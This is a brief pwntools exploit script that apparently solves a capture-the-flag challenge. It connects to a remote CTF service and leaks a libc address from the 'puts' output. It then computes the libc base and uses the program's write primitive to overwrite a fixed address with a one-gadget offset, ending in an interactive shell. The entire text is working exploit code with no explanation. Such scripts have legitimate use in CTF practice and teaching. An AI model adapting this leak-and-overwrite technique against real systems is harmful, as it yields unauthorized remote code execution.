from pwn import *
#io = process("./write",env={"LD_PRELOAD":"./libc-2.27.so"})

io = remote("pwn.byteband.it",9000)

io.recvuntil("puts: ")
puts = io.recv(14)

dis =0x619f60
leak = int(puts,16)-0x809c0
addr = leak + dis

io.recvuntil("(q)uit")
io.sendline("w")
print hex(leak)
io.recvuntil("ptr: ")
io.sendline(str(addr))

io.recvuntil("val: ")

io.sendline(str(leak+0xe569f))
#gdb.attach(io)
io.interactive()
